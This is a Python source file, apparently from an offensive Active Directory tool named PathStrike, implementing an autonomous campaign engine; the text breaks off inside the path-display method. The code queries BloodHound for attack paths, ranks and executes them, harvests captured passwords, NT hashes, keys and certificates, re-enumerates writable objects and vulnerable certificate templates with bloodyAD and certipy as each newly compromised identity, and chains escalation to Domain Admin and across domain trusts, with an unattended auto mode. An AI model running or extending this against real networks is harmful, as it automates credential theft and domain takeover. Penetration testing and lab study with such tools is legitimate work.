"""Autonomous campaign orchestrator — discover, rank, execute, chain.

The :class:`CampaignOrchestrator` wraps the existing single-path
:class:`AttackOrchestrator` in a discovery loop:

1. **Discover** — query BH CE for ALL reachable high-value targets
2. **Score** — rank paths by privilege value and feasibility
3. **Execute** — run the highest-value path via the existing orchestrator
4. **Re-discover** — from the newly compromised position, find new paths
5. **Chain** — repeat until nothing new is exploitable

Trust escalation (child→parent) is automatically detected and queued
when Domain Admin is reached in a child domain.
"""

from __future__ import annotations

import logging
import time
from typing import Any

from rich.console import Console
from rich.table import Table

from pathstrike.bloodhound.client import BloodHoundClient
from pathstrike.bloodhound.cypher import (
    build_high_value_nodes_query,
    build_reachable_target_names_query,
    build_shortest_path_to_target_query,
    build_trust_map_query,
)
from pathstrike.engine.capability_graph import CapabilityGraph
from pathstrike.bloodhound.parser import parse_cypher_response
from pathstrike.config import PathStrikeConfig
from pathstrike.engine.credential_store import CredentialStore
from pathstrike.engine.orchestrator import AttackOrchestrator
from pathstrike.engine.rollback import RollbackManager
from pathstrike.engine.scoring import (
    describe_score,
    rank_paths,
    score_target_node,
)
from pathstrike.models import (
    AttackPath,
    CampaignResult,
    ExecutionMode,
    ScoredPath,
)

logger = logging.getLogger("pathstrike.engine.campaign")
console = Console()


def _normalise_certipy_principal(principal: str, domain: str) -> str | None:
    """Convert certipy's ``DOMAIN\\NAME`` / ``DOMAIN.FQDN\\NAME`` to ``NAME@DOMAIN``.

    Returns ``None`` for empty input.  Unrecognised formats (no
    backslash, no ``@``) are returned upper-cased with the configured
    domain appended so BH lookup still has something to match.
    """
    if not principal:
        return None
    p = principal.strip()
    if "\\" in p:
        _, _, short = p.partition("\\")
    elif "@" in p:
        short, _, _ = p.partition("@")
    else:
        short = p
    short = short.strip()
    if not short:
        return None
    return f"{short.upper()}@{domain.upper()}"


def _dn_to_bh_name(dn: str, domain: str) -> str | None:
    """Convert an LDAP distinguishedName to BH CE's ``NAME@DOMAIN`` format.

    BH CE stores User/Group/Computer nodes with a canonical ``name``
    property of ``SAMACCOUNTNAME@DOMAIN.FQDN`` (upper-cased).  We
    approximate by taking the first RDN's CN value.  Returns ``None``
    when the DN doesn't start with a CN= component (e.g. DNS records,
    container objects, ForeignSecurityPrincipals that have SIDs as CN).

    This is a best-effort conversion — for computer accounts the BH
    name may be ``COMPUTER.DOMAIN`` rather than ``COMPUTER@DOMAIN``
    depending on how SharpHound collected it.  Callers should treat
    lookup mismatches as "no equivalent BH node" and skip.
    """
    if not dn:
        return None
    first = dn.split(",", 1)[0].strip()
    if not first.upper().startswith("CN="):
        return None
    name = first[3:].strip()
    if not name:
        return None
    return f"{name.upper()}@{domain.upper()}"


class CampaignOrchestrator:
    """Autonomous attack campaign engine.

    Wraps :class:`AttackOrchestrator` in a discover → rank → execute
    loop that automatically chains paths and escalates across trust
    boundaries.
    """

    def __init__(
        self,
        config: PathStrikeConfig,
        bh_client: BloodHoundClient,
        cred_store: CredentialStore,
        rollback_mgr: RollbackManager,
        retry_policy: Any = None,
        mode: ExecutionMode = ExecutionMode.interactive,
        verbose: bool = False,
        max_targets: int = 10,
        reachable_mode: bool = False,
        max_depth: int = 10,
    ) -> None:
        self.config = config
        self.bh_client = bh_client
        self.cred_store = cred_store
        self.rollback_mgr = rollback_mgr
        self.retry_policy = retry_policy
        self.mode = mode
        self.verbose = verbose
        self.max_targets = max_targets
        self.reachable_mode = reachable_mode
        self.max_depth = max_depth

        # Campaign state
        self.owned_identities: set[str] = set()
        self.queried_identities: set[str] = set()
        self.completed_targets: set[str] = set()
        self.failed_paths: list[ScoredPath] = []
        self.domains_compromised: set[str] = set()
        self._captured_creds: list[dict[str, str]] = []

        # Live-enum capability graph (Option A): populated after each
        # successful compromise with edges discovered by bloodyAD /
        # direct LDAP queries.  Consulted alongside BH CE during
        # discovery to surface newly-reachable targets that BH's
        # static snapshot doesn't know about.
        self.capability_graph = CapabilityGraph()
        # Track which identities we've already run live-enum for in this
        # session so we don't re-query on every round.
        self._enumerated_identities: set[str] = set()
        # Track which identities we've run `certipy find -vulnerable` for.
        # ADCS findings are domain-scoped but the set of templates the
        # authenticating user can actually enroll in differs per principal,
        # so we re-run for each new identity.
        self._adcs_enumerated_identities: set[str] = set()

    async def run_campaign(self) -> CampaignResult:
        """Execute the autonomous campaign loop.

        Returns:
            Summary of the campaign's results.
        """
        start_time = time.time()
        result = CampaignResult()

        # Seed with initial identity
        initial_user = self.config.credentials.username
        initial_domain = self.config.domain.name
        initial_identity = f"{initial_user.upper()}@{initial_domain.upper()}"
        self.owned_identities.add(initial_identity)

        console.print(
            f"\n[bold]Starting autonomous campaign from:[/] "
            f"[green]{initial_identity}[/]\n"
        )

        max_iterations = 20  # Safety limit to prevent infinite loops
        iteration = 0
        while iteration < max_iterations:
            iteration += 1

            # Find identities we haven't queried yet
            to_query = self.owned_identities - self.queried_identities
            if not to_query:
                console.print(
                    "\n[bold yellow]No more identities to explore. "
                    "Campaign complete.[/]"
                )
                break

            # --- DISCOVER ---
            all_paths: list[AttackPath] = []
            all_scored: list[ScoredPath] = []
            for identity in to_query:
                self.queried_identities.add(identity)
                console.print(
                    f"[bold]Discovering paths from:[/] [cyan]{identity}[/]"
                )

                if self.reachable_mode:
                    paths = await self._discover_reachable_paths(identity)
                else:
                    paths = await self._discover_paths(identity)
                if paths:
                    all_paths.extend(paths)
                    scored = rank_paths(paths)
                    scored = [
                        s for s in scored
                        if s.path.target.name not in self.completed_targets
                    ]
                    all_scored.extend(scored)

            # Compose trust chains: if a path reaches DA/Domain, append
            # trust edges to create end-to-end cross-domain paths
            trust_extensions = await self._get_trust_edges()
            if trust_extensions:
                composed = self._compose_trust_chains(all_paths, trust_extensions)
                if composed:
                    composed_scored = rank_paths(composed)
                    all_scored.extend(composed_scored)

            # Also add any post-DA trust paths if domains already compromised
            trust_paths = await self._discover_trust_escalation()
            if trust_paths:
                trust_scored = rank_paths(trust_paths)
                all_scored.extend(trust_scored)

            # Re-sort combined results and deduplicate by target
            all_scored.sort(key=lambda s: s.composite_score, reverse=True)
            seen_targets: set[str] = set()
            deduped: list[ScoredPath] = []
            for sp in all_scored:
                if sp.path.target.name not in seen_targets:
                    seen_targets.add(sp.path.target.name)
                    deduped.append(sp)
            all_scored = deduped

            if not all_scored:
                console.print(
                    "\n[bold yellow]No exploitable paths discovered. "
                    "Campaign complete.[/]"
                )
                break

            # --- DISPLAY ---
            self._display_ranked_paths(all_scored, iteration)

            # --- SELECT ---
            if self.mode == ExecutionMode.interactive:
                selected = self._interactive_select(all_scored)
                if selected is None:
                    console.print("[yellow]Campaign aborted by user.[/]")
                    result.duration_seconds = time.time() - start_time
                    return result
                execution_queue = [selected]
            elif self.mode == ExecutionMode.auto:
                execution_queue = all_scored[:self.max_targets]
            else:
                # Dry run — show all and stop
                for sp in all_scored[:self.max_targets]:
                    await self._execute_path(sp)
                break

            # --- EXECUTE ---
            executed_any = False
            for scored_path in execution_queue:
                target_name = scored_path.path.target.name
                if target_name in self.completed_targets:
                    continue

                success = await self._execute_path(scored_path)
                result.total_paths_attempted += 1

                if success:
                    result.total_paths_succeeded += 1
                    self.completed_targets.add(target_name)
                    result.targets_compromised.append(target_name)
                    executed_any = True

                    # Harvest new identities from credential store
                    self._harvest_new_identities()

                    # Claim every node along the exploited path as owned so
                    # subsequent rounds re-query from intermediate positions
                    # (e.g. after compromising MANAGEMENT group via Judith's
                    # WriteOwner, next round queries from MANAGEMENT's POV).
                    self._claim_path_nodes_as_owned(scored_path)

                    # Live-enum any newly-owned identity so edges that
                    # BH CE's snapshot doesn't reflect (e.g. writeables
                    # we inherited via a group membership added during
                    # the current campaign) are discoverable next round.
                    await self._enumerate_live_capabilities()

                    # Check if we compromised a domain
                    self._check_domain_compromise(scored_path)

                    if self.mode != ExecutionMode.dry_run:
                        console.print(
                            f"\n[bold green]Target compromised:[/] {target_name} "
                            f"(score: {scored_path.target_score:.0f} — "
                            f"{describe_score(scored_path.target_score)})"
                        )

                    # Re-discover after escalation
                    if self.config.campaign.rescan_after_escalation:
                        break  # Break to outer loop for re-discovery
                else:
                    result.total_paths_failed += 1
                    self.failed_paths.append(scored_path)

            if not executed_any:
                console.print(
                    "\n[bold yellow]No more paths to execute. "
                    "Campaign complete.[/]"
                )
                break

        # --- SUMMARY ---
        result.domains_compromised = list(self.domains_compromised)
        result.credentials_captured = sum(
            len(creds) for creds in self.cred_store._credentials.values()
        )
        result.duration_seconds = time.time() - start_time

        # Snapshot credentials before they get wiped
        self._captured_creds = self._snapshot_credentials()

        self._display_campaign_summary(result)
        self._save_credentials_file()
        return result

    # ------------------------------------------------------------------
    # Discovery
    # ------------------------------------------------------------------

    async def _discover_paths(
        self, identity: str
    ) -> list[AttackPath]:
        """Query BH CE for shortest paths to each high-value target.

        Two-step approach:
        1. Find all high-value nodes in the domain
        2. For each, query the shortest path from identity → target
        """
        domain = self.config.domain.name

        # Step 1: Find all high-value targets
        hv_query, _ = build_high_value_nodes_query(domain)
        try:
            hv_response = await self.bh_client.cypher_query(hv_query)
        except Exception as exc:
            logger.warning("High-value target discovery failed: %s", exc)
            return []

        # Extract target names from literals
        target_names: list[str] = []
        literals = hv_response.get("data", {}).get("literals", [])
        for lit in literals:
            if lit.get("key") == "name" and lit.get("value"):
                target_names.append(lit["value"])

        if not target_names:
            logger.info("No high-value targets found in %s", domain)
            return []

        logger.info(
            "Found %d high-value target(s) in %s", len(target_names), domain,
        )

        # Step 2: Find shortest path to each target
        all_paths: list[AttackPath] = []
        for target_name in target_names:
            if target_name == identity:
                continue
            if target_name in self.completed_targets:
                continue

            path_query, _ = build_shortest_path_to_target_query(
                identity, target_name,
            )
            try:
                response = await self.bh_client.cypher_query(path_query)
                paths = parse_cypher_response(response)
                all_paths.extend(paths)
            except Exception as exc:
                logger.debug("No path to %s: %s", target_name, exc)

        logger.info(
            "Discovered %d reachable path(s) from %s",
            len(all_paths), identity,
        )
        return all_paths

    # Well-known pseudo-principals that BH CE links through ClaimSpecialIdentity
    # etc.  Including them in path discovery pollutes the target list — every
    # user implicitly reaches SCHANNEL AUTHENTICATION, EVERYONE, etc., but
    # those aren't real attack targets.
    _WELL_KNOWN_PRINCIPALS = frozenset({
        "EVERYONE",
        "AUTHENTICATED USERS",
        "THIS ORGANIZATION",
        "ANONYMOUS LOGON",
        "INTERACTIVE",
        "NETWORK",
        "BATCH",
        "SERVICE",
        "SELF",
        "SYSTEM",
        "LOCAL SERVICE",
        "NETWORK SERVICE",
        "SCHANNEL AUTHENTICATION",
        "NTLM AUTHENTICATION",
        "DIGEST AUTHENTICATION",
        "ENTERPRISE DOMAIN CONTROLLERS",
        "OTHER ORGANIZATION",
        "PRINCIPAL SELF",
        "OWNER RIGHTS",
    })

    @classmethod
    def _is_well_known_principal(cls, name: str) -> bool:
        """Return True if *name* is a well-known pseudo-principal."""
        if not name:
            return False
        # Strip the @domain suffix if present — pseudo principals are named
        # like "SCHANNEL AUTHENTICATION@CERTIFIED.HTB"
        short = name.split("@", 1)[0].strip().upper()
        return short in cls._WELL_KNOWN_PRINCIPALS

    async def _discover_reachable_paths(
        self, identity: str
    ) -> list[AttackPath]:
        """Query BH CE for paths to ALL exploitable reachable nodes.

        Two-step discovery:

        1. Enumerate every reachable User/Group/Computer/Domain name via
           :func:`build_reachable_target_names_query`.
        2. Run :func:`build_shortest_path_to_target_query` per target to
           retrieve a discrete path.

        This mirrors :meth:`_discover_paths` (the high-value variant).
        It's needed because BH CE's Cypher endpoint returns a single
        flat graph when multiple paths match a ``RETURN p`` query —
        individual paths are lost, so Pathstrike can only reliably parse
        one path per query.

        Well-known pseudo-principals (EVERYONE, SCHANNEL AUTHENTICATION,
        etc.) are filtered out — they're implicit targets for every
        principal in AD and aren't useful escalation destinations.
        """
        # Can't authenticate as a pseudo-principal — BH queries from these
        # sources are guaranteed to be noise.  Skip silently instead of
        # logging a warning for every single one of them during multi-
        # round re-discovery.
        if self._is_well_known_principal(identity):
            logger.debug(
                "Skipping discovery from pseudo-principal source: %s", identity,
            )
            return []

        # Step 1: enumerate reachable target names
        names_query, _ = build_reachable_target_names_query(
            identity, max_depth=self.max_depth,
        )
        try:
            names_response = await self.bh_client.cypher_query(names_query)
        except Exception as exc:
            # 404 for cypher = "no results / endpoint returned empty" — demote
            # from WARNING to DEBUG so it doesn't clutter default output.
            exc_str = str(exc)
            if "404" in exc_str or "resource not found" in exc_str:
                logger.debug(
                    "Reachable-target name discovery empty for %s: %s",
                    identity, exc_str[:200],
                )
            else:
                logger.warning("Reachable-target name discovery failed: %s", exc)
            return []

        target_names: list[str] = []
        literals = names_response.get("data", {}).get("literals", [])
        for lit in literals:
            if lit.get("key") == "name" and lit.get("value"):
                target_names.append(lit["value"])

        if not target_names:
            logger.info("No reachable targets found from %s", identity)
            return []

        # Filter well-knowns and already-completed up front so we don't
        # waste round-trips on per-target queries we'd throw away.
        filtered_names = [
            n for n in target_names
            if n != identity
            and n not in self.completed_targets
            and not self._is_well_known_principal(n)
        ]
        pseudo_count = len(target_names) - len(filtered_names)

        # Step 2: fetch a discrete shortest path per surviving target.
        all_paths: list[AttackPath] = []
        for target_name in filtered_names:
            path_query, _ = build_shortest_path_to_target_query(
                identity, target_name,
            )
            try:
                response = await self.bh_client.cypher_query(path_query)
                paths = parse_cypher_response(response)
                all_paths.extend(paths)
            except Exception as exc:
                logger.debug("No path to %s: %s", target_name, exc)

        # Also surface any edges discovered via live enumeration
        # (CapabilityGraph) that aren't already represented as BH paths.
        # These become single-hop synthetic AttackPath objects.
        live_paths = self._build_paths_from_capability_graph(identity)
        if live_paths:
            # Dedup by target name — prefer BH paths (multi-hop, known
            # edge metadata) over single-hop synthetic ones.
            bh_targets = {p.target.name for p in all_paths}
            for sp in live_paths:
                if sp.target.name not in bh_targets:
                    all_paths.append(sp)

        logger.info(
            "Discovered %d reachable path(s) from %s "
            "(%d targets enumerated, %d pseudo-principals filtered, "
            "%d from live-enum)",
            len(all_paths), identity, len(target_names), pseudo_count,
            len(live_paths),
        )
        return all_paths

    def _build_paths_from_capability_graph(
        self, identity: str,
    ) -> list[AttackPath]:
        """Turn CapabilityGraph edges for *identity* into single-hop AttackPaths.

        The returned paths are 1-step ``AttackPath`` instances whose
        ``edge_type`` matches a registered Pathstrike handler so the
        existing orchestrator can exploit them without special-casing.
        Synthesised ``NodeInfo`` / ``EdgeInfo`` objects have empty
        ``object_id`` / ``domain`` fields — they're best-effort and
        will miss any handler logic that reads those attributes.
        """
        from pathstrike.models import EdgeInfo, NodeInfo, PathStep

        edges = self.capability_graph.get_outbound(identity)
        if not edges:
            return []

        paths: list[AttackPath] = []
        domain = self.config.domain.name
        for cap_edge in edges:
            # Don't re-surface edges we've already completed / exploited.
            if cap_edge.target in self.completed_targets:
                continue
            if self._is_well_known_principal(cap_edge.target):
                continue

            source_node = NodeInfo(
                object_id="", name=cap_edge.source,
                label="User", domain=domain, properties={},
            )
            target_node = NodeInfo(
                object_id="", name=cap_edge.target,
                label="User", domain=domain, properties={},
            )
            edge = EdgeInfo(
                edge_type=cap_edge.edge_type,
                source=source_node,
                target=target_node,
                properties={"discovered_via": cap_edge.source_method},
            )
            step = PathStep(
                index=0,
                edge=edge,
                handler_name=None,
                status="pending",
                result=None,
            )
            paths.append(
                AttackPath(
                    steps=[step],
                    source=source_node,
                    target=target_node,
                )
            )
        return paths

    async def _discover_trust_escalation(self) -> list[AttackPath]:
        """Check for trust edges from compromised domains.

        Only triggers after DA is achieved in at least one domain.
        Returns trust paths that haven't been executed yet.
        """
        if not self.domains_compromised:
            return []

        trust_paths: list[AttackPath] = []
        try:
            query, _ = build_trust_map_query()
            response = await self.bh_client.cypher_query(query)
            all_trust = parse_cypher_response(response)

            for tp in all_trust:
                target = tp.target.name.upper()
                # Skip if target is already compromised or in a compromised domain
                if target in self.completed_targets:
                    continue
                if target in self.domains_compromised:
                    continue
                trust_paths.append(tp)
        except Exception as exc:
            logger.debug("Trust discovery failed: %s", exc)

        return trust_paths

    async def _get_trust_edges(self) -> list[AttackPath]:
        """Get individual trust edges as single-step AttackPaths.

        The trust query returns all edges between Domain nodes.  We split
        the parsed path into individual single-edge paths so each can be
        composed independently (child→parent vs parent→child).
        """
        from pathstrike.models import PathStep

        try:
            query, _ = build_trust_map_query()
            response = await self.bh_client.cypher_query(query)
            parsed = parse_cypher_response(response)

            individual: list[AttackPath] = []
            for path in parsed:
                for step in path.steps:
                    # Create a single-step AttackPath for each trust edge
                    single = AttackPath(
                        steps=[PathStep(
                            index=0,
                            edge=step.edge,
                            handler_name=step.handler_name,
                            status="pending",
                        )],
                        source=step.edge.source,
                        target=step.edge.target,
                    )
                    # Skip trust edges pointing back to already-compromised domains
                    if single.target.name.upper() in self.domains_compromised:
                        continue
                    if single.target.name.upper() in {t.upper() for t in self.completed_targets}:
                        continue
                    individual.append(single)

            logger.debug("Found %d individual trust edge(s)", len(individual))
            return individual
        except Exception as exc:
            logger.debug("Trust edge discovery failed: %s", exc)
            return []

    def _compose_trust_chains(
        self,
        base_paths: list[AttackPath],
        trust_paths: list[AttackPath],
    ) -> list[AttackPath]:
        """Compose DA paths with trust edges into end-to-end cross-domain paths.

        If a base path ends at DA or a Domain node, and a trust edge
        starts from that domain, create a combined path that goes all
        the way through the trust boundary.
        """
        from pathstrike.models import PathStep

        composed: list[AttackPath] = []
        da_names = {"DOMAIN ADMINS", "ENTERPRISE ADMINS", "ADMINISTRATORS"}

        for base in base_paths:
            target_name = base.target.name.split("@")[0].upper()
            # Extract domain from the target name (e.g. DOMAIN ADMINS@NORTH.SEV... → NORTH.SEV...)
            if "@" in base.target.name:
                target_domain = base.target.name.split("@")[1].upper()
            elif base.target.domain:
                target_domain = base.target.domain.upper()
            else:
                target_domain = base.target.name.upper()  # Domain nodes ARE the domain

            # Check if this path reaches DA or a Domain node
            is_da_path = target_name in da_names or base.target.label == "Domain"
            if not is_da_path:
                continue

            logger.debug(
                "Composable DA path: %s (domain=%s)", base.target.name, target_domain,
            )

            # Find trust edges FROM this domain TO another domain
            for trust in trust_paths:
                trust_source = trust.source.name.upper()
                trust_target = trust.target.name.upper()

                # Trust source must match the DA path's domain
                if trust_source != target_domain:
                    continue

                # Skip if trust goes back to same domain
                if trust_target == target_domain:
                    continue

                # Skip already completed
                if trust.target.name in self.completed_targets:
                    continue

                logger.debug(
                    "Composing: %s → [trust] → %s",
                    base.target.name, trust.target.name,
                )

                # Compose: base path steps + trust path steps
                combined_steps = list(base.steps)
                for i, trust_step in enumerate(trust.steps):
                    combined_steps.append(
                        PathStep(
                            index=len(combined_steps),
                            edge=trust_step.edge,
                            handler_name=trust_step.handler_name,
                            status="pending",
                        )
                    )

                composed_path = AttackPath(
                    steps=combined_steps,
                    source=base.source,
                    target=trust.target,
                )
                composed.append(composed_path)

        return composed

    # ------------------------------------------------------------------
    # Execution
    # ------------------------------------------------------------------

    async def _execute_path(self, scored: ScoredPath) -> bool:
        """Execute a single scored path via the existing orchestrator."""
        path = scored.path

        if self.mode == ExecutionMode.dry_run:
            console.print(
                f"  [dim][DRY RUN] Would execute {len(path.steps)} steps "
                f"to {path.target.name}[/]"
            )
            return True

        orchestrator = AttackOrchestrator(
            self.config,
            self.cred_store,
            self.rollback_mgr,
            retry_policy=self.retry_policy,
            verbose=self.verbose,
        )

        try:
            return await orchestrator.execute_path(path, self.mode)
        except Exception as exc:
            logger.error("Path execution failed: %s", exc)
            return False

    # ------------------------------------------------------------------
    # State tracking
    # ------------------------------------------------------------------

    def _harvest_new_identities(self) -> None:
        """Extract newly captured identities from the credential store."""
        for key in self.cred_store._credentials:
            identity = key.upper()
            if identity not in self.owned_identities:
                self.owned_identities.add(identity)
                logger.info("New identity captured: %s", identity)

    async def _enumerate_live_capabilities(self) -> None:
        """Run ``bloodyAD get writable`` per owned human/service identity.

        Each newly-owned principal (that we haven't enumerated yet in
        this campaign) is queried for its effective writeable objects.
        Results are added to :attr:`capability_graph` as edges, which
        :meth:`_discover_reachable_paths` then consults alongside BH CE.

        Scope of this first implementation (Phase 3A):
        * Only standard ACE writes (WRITE / OWN / WRITE_OWNER / WRITE_DACL).
        * Does NOT cover extended rights (AddSelf, ForceChangePassword,
          ReadGMSAPassword, ReadLAPSPassword) or DCSync — a direct LDAP
          ACL scanner in Phase 3B will fill that in.
        * Only user/computer identities with credentials in the store
          (groups can't authenticate; their rights surface via user
          memberships).
        """
        from pathstrike.tools.bloodyad_wrapper import get_writable

        domain = self.config.domain.name

        for identity in self.owned_identities:
            if identity in self._enumerated_identities:
                continue

            # Strip @DOMAIN to get sAMAccountName for credential lookup.
            if "@" in identity:
                user_part, _, id_domain = identity.partition("@")
            else:
                user_part = identity
                id_domain = domain

            # Only attempt enumeration for identities we can authenticate
            # as — skip Groups / pseudo-principals / anything without a
            # credential in the store.
            cred = self.cred_store.get_best_credential(user_part, id_domain)
            if cred is None:
                logger.debug(
                    "live-enum: no credential for %s; skipping", identity,
                )
                self._enumerated_identities.add(identity)
                continue

            auth_args = self._build_auth_args_for_identity(user_part, id_domain)
            if not auth_args:
                self._enumerated_identities.add(identity)
                continue

            logger.info("Live-enum: querying writeables as %s", identity)
            try:
                result = await get_writable(self.config, auth_args)
            except Exception as exc:
                logger.debug("Live-enum failed for %s: %s", identity, exc)
                self._enumerated_identities.add(identity)
                continue

            self._enumerated_identities.add(identity)

            if not result.get("success"):
                logger.debug(
                    "Live-enum returned no data for %s: %s",
                    identity, result.get("error", "unknown"),
                )
                continue

            parsed = result.get("parsed") or {}
            entries = parsed.get("writable_targets", []) or []

            added = 0
            for entry in entries:
                dn = entry.get("dn")
                edge_type = entry.get("edge_type")
                if not dn or not edge_type:
                    continue
                target_name = _dn_to_bh_name(dn, domain)
                if not target_name:
                    continue
                # Skip self-writes (writing to your own account doesn't
                # help escalation) and SIDs (Foreign Security Principals).
                if target_name == identity:
                    continue
                short = target_name.split("@", 1)[0]
                if short.startswith("S-") and all(
                    c.isdigit() or c == "-" for c in short[1:]
                ):
                    continue
                if self.capability_graph.add_edge(
                    source=identity,
                    edge_type=edge_type,
                    target=target_name,
                    source_method="bloodyad:get-writable",
                ):
                    added += 1

            if added:
                logger.info(
                    "Live-enum: added %d new edge(s) from %s to capability graph",
                    added, identity,
                )
            else:
                logger.debug(
                    "Live-enum: no new exploitable edges for %s", identity,
                )

            # Also run ADCS enumeration for this identity (Phase 3B).
            await self._enumerate_adcs_for_identity(identity, user_part, id_domain)

    async def _enumerate_adcs_for_identity(
        self, identity: str, user: str, domain: str,
    ) -> None:
        """Run ``certipy find -vulnerable`` as *identity* and record ESC edges.

        ADCS escalation paths (ESC1–13) are often missed by BloodHound's
        static snapshot — SharpHound may not collect cert templates, or
        analysis may be stale.  We enumerate live with certipy per owned
        identity: different principals see different vulnerable templates
        based on their enrollment rights.  Results populate the
        capability graph as synthetic ``ADCSESCx`` edges pointing at the
        domain root, so existing ADCS handlers (adcs.py) can exploit
        them during the next discovery round.
        """
        if identity in self._adcs_enumerated_identities:
            return

        certipy_auth = self._build_certipy_auth_args_for_identity(user, domain)
        if not certipy_auth:
            self._adcs_enumerated_identities.add(identity)
            return

        from pathstrike.tools.certipy_wrapper import certipy_find

        dc = self.config.domain.dc_fqdn or self.config.domain.dc_host
        logger.info("Live-enum (ADCS): running `certipy find -vulnerable` as %s", identity)
        try:
            result = await certipy_find(
                target=dc,
                auth_args=certipy_auth,
                vulnerable=True,
                stdout=False,
                timeout=120,
            )
        except Exception as exc:
            logger.debug("certipy find failed for %s: %s", identity, exc)
            self._adcs_enumerated_identities.add(identity)
            return

        self._adcs_enumerated_identities.add(identity)

        if not result.get("success"):
            logger.debug(
                "certipy find returned no data for %s: %s",
                identity, result.get("error", "unknown"),
            )
            return

        parsed = result.get("parsed") or {}
        findings = parsed.get("findings", []) or []
        if not findings:
            logger.debug("certipy find: no vulnerable templates visible to %s", identity)
            return

        domain_upper = domain.upper()
        domain_node = domain_upper  # BH domain nodes use the FQDN as `name`

        added = 0
        for finding in findings:
            edge_type = finding.get("edge_type")
            principal = finding.get("principal") or ""
            if not edge_type:
                continue

            # Resolve the ESC's source principal:
            # If certipy named a specific principal, normalise it.
            # Otherwise fall back to the enumerating identity — since they
            # can see this vulnerability, it's actionable from their POV.
            source = (
                _normalise_certipy_principal(principal, domain)
                if principal else identity
            )
            if not source:
                source = identity

            # Target of an ADCS escalation is the domain (→ DA in practice).
            if self.capability_graph.add_edge(
                source=source,
                edge_type=edge_type,
                target=domain_node,
                source_method=f"certipy:find-vulnerable/{finding.get('esc', '?')}",
            ):
                added += 1

        if added:
            logger.info(
                "Live-enum (ADCS): recorded %d ADCS edge(s) from %s findings",
                added, identity,
            )

    def _build_certipy_auth_args_for_identity(
        self, user: str, domain: str,
    ) -> list[str]:
        """Certipy-style auth args mirroring :meth:`_build_auth_args_for_identity`.

        Certipy uses ``-u user@domain``, ``-p``, ``-hashes :NT``, ``-k``,
        ``-pfx`` — slightly different flag names from bloodyAD.
        """
        from pathstrike.models import CredentialType

        cred = self.cred_store.get_best_credential(user, domain)
        if cred is None:
            return []

        args: list[str] = [
            "-u", f"{user}@{domain}",
            "-dc-ip", self.config.domain.dc_host,
        ]
        match cred.cred_type:
            case CredentialType.password:
                args.extend(["-p", cred.value])
            case CredentialType.nt_hash:
                args.extend(["-hashes", f":{cred.value}"])
            case CredentialType.aes_key:
                args.extend(["-aes", cred.value])
            case CredentialType.ccache:
                args.append("-k")
            case CredentialType.certificate:
                args.extend(["-pfx", cred.value])
            case _:
                return []
        return args

    def _build_auth_args_for_identity(
        self, user: str, domain: str,
    ) -> list[str]:
        """Assemble bloodyAD auth args for a specific owned identity.

        Mirrors BaseEdgeHandler._auth_args_from_credential but operates
        from the orchestrator's point of view (no handler instance) —
        the credential store lookup is the same.
        """
        from pathstrike.models import CredentialType

        cred = self.cred_store.get_best_credential(user, domain)
        if cred is None:
            return []

        args: list[str] = ["-u", cred.username]
        match cred.cred_type:
            case CredentialType.password:
                args.extend(["-p", cred.value])
            case CredentialType.nt_hash:
                args.extend(["-p", f":{cred.value}"])
            case CredentialType.aes_key | CredentialType.ccache:
                args.extend(["-k", "--dc-ip", self.config.domain.dc_host])
            case CredentialType.certificate:
                args.extend(["-c", cred.value])
            case _:
                return []
        return args

    def _claim_path_nodes_as_owned(self, scored: ScoredPath) -> None:
        """Mark every node in a successfully-exploited path as owned.

        After a path is compromised, every intermediate node along the
        chain is effectively under the attacker's control for query
        purposes (the attacker can now traverse BH CE edges *from* those
        nodes via group membership, ACL grants, etc.).  Adding them to
        ``owned_identities`` makes the next discovery round re-query
        from each node, exposing paths that only branch off at mid-chain
        — useful for step-through exploration and pentest reporting.

        Credential capture is still handled separately by the cred_store;
        this is purely about BH CE query perspective, not authentication.
        """
        for step in scored.path.steps:
            for endpoint in (step.edge.source, step.edge.target):
                if not endpoint or not endpoint.name:
                    continue
                name = endpoint.name.upper()
                # Pseudo-principals (EVERYONE, AUTHENTICATED USERS, SCHANNEL
                # AUTHENTICATION, etc.) can't be authenticated as — adding
                # them to owned_identities just produces 404s on next-round
                # discovery queries.  Skip them silently.
                if self._is_well_known_principal(name):
                    continue
                if name not in self.owned_identities:
                    self.owned_identities.add(name)
                    logger.info(
                        "Node marked as owned (compromised in path): %s", name,
                    )

    def _check_domain_compromise(self, scored: ScoredPath) -> None:
        """Check if the completed path represents domain compromise.

        For composed paths (DA + trust), also marks intermediate domains
        as compromised when DA/Domain targets are encountered mid-path.
        """
        da_names = {"DOMAIN ADMINS", "ENTERPRISE ADMINS", "ADMINISTRATORS"}

        # Check ALL steps in the path — not just the final target
        for step in scored.path.steps:
            step_target = step.edge.target
            step_name = step_target.name.split("@")[0].upper()

            if step_name in da_names:
                domain = (
                    step_target.domain
                    or (step_target.name.split("@")[1] if "@" in step_target.name else "")
                )
                if domain:
                    domain_upper = domain.upper()
                    if domain_upper not in self.domains_compromised:
                        self.domains_compromised.add(domain_upper)
                        self.completed_targets.add(step_target.name)
                        console.print(
                            f"  [bold red]Domain compromised:[/] [green]{domain}[/]"
                        )

            if step_target.label and step_target.label.lower() == "domain":
                name_upper = step_target.name.upper()
                if name_upper not in self.domains_compromised:
                    self.domains_compromised.add(name_upper)
                    self.completed_targets.add(step_target.name)
                    console.print(
                        f"  [bold red]Domain compromised:[/] [green]{step_target.name}[/]"
                    )

    # ------------------------------------------------------------------
    # Selection
    # ------------------------------------------------------------------

    def _interactive_select(
        self, scored: list[ScoredPath]
    ) -> ScoredPath | None:
        """Let the user pick a target by number.

        Returns the selected ScoredPath, or None to abort.
        """
        console.print(
            "\n[bold]Select a target to attack:[/] "
            "[dim](enter number, or 'q' to quit)[/]"
        )
        choice = console.input(f"[1-{len(scored[:20])}] (1): ").strip()

        if choice.lower() == "q":
            return None

        if choice == "" or choice.lower() == "y":
            return scored[0]

        try:
            idx = int(choice) - 1
            if 0 <= idx < len(scored):
                target = scored[idx]
                console.print(
                    f"  Selected: [green]{target.path.target.name}[/] "
                    f"(score: {target.composite_score:.1f})"
                )
                return target
        except ValueError:
            pass

        console.print("[yellow]Invalid selection, using #1.[/]")
        return scored[0]

    # ------------------------------------------------------------------
    # Display
    # ------------------------------------------------------------------

    def _display_ranked_paths(
        self, scored: list[ScoredPath], iteration: int
    ) -> None:
        """Show a Rich table of ranked attack paths."""
        table = Table(
            title=f"Discovered Attack Paths (Round {iteration})",
        )
        table.add_column("#", style="bold", width=3)
        table.add_column("Score", style="bold", width=7)
        table.add_column("Level", style="red", width=10)
        table.add_column("Target", style="green")
        table.add_column("Domain", style="cyan")
        table.add_column("Steps", style="yellow", width=5)
        table.add_column("Edge Types", style="dim")

        for i, sp in enumerate(scored[:20], 1):
